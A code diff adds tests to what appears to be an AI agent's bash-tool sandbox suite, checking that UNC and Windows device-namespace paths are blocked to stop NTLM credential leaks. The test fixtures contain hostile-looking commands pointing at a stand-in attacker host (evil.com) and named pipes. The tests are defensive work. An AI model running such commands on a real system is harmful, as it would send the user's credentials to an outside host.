@@ -110,6 +110,48 @@ describe('bash git guardrail parity', () => {
 })
 
 // ============================================================
+// UNC / device-namespace blocking — NTLM credential-leak prevention
+// ============================================================
+
+describe('bash UNC / device-namespace blocking', () => {
+  afterEach(() => {
+    vi.restoreAllMocks()
+  })
+
+  const blockedUnc = [
+    { desc: 'backslash UNC', cmd: 'type \\\\evil.com\\share\\x' },
+    { desc: 'forward-slash UNC', cmd: 'cat //server/share/x' },
+    { desc: 'NT namespace device prefix', cmd: 'dir \\??\\UNC\\evil\\share' },
+    { desc: 'Win32 verbatim namespace', cmd: 'dir \\\\?\\UNC\\evil\\share' },
+    { desc: 'DOS device namespace', cmd: 'type \\\\.\\pipe\\x' },
+  ]
+
+  for (const { desc, cmd } of blockedUnc) {
+    it(`blocks: ${desc}`, async () => {
+      mockSafeSpawn()
+      const result = await bashTool.execute({ command: cmd, description: 'test' }, ctx)
+      expect(result.success).toBe(false)
+      expect(result.error).toContain('UNC or device-namespace')
+    })
+  }
+
+  it('allows http/https URLs (not UNC)', async () => {
+    mockSafeSpawn()
+    const result = await bashTool.execute(
+      { command: 'curl -s https://example.com/api', description: 'test' },
+      ctx,
+    )
+    expect(result.success).toBe(true)
+  })
+
+  it('allows escaped backslashes (not UNC)', async () => {
+    mockSafeSpawn()
+    const result = await bashTool.execute({ command: 'echo \\\\n', description: 'test' }, ctx)
+    expect(result.success).toBe(true)
+  })
+})
+
+// ============================================================
 // detectViolations — sandbox violation reporting
 // ============================================================
 
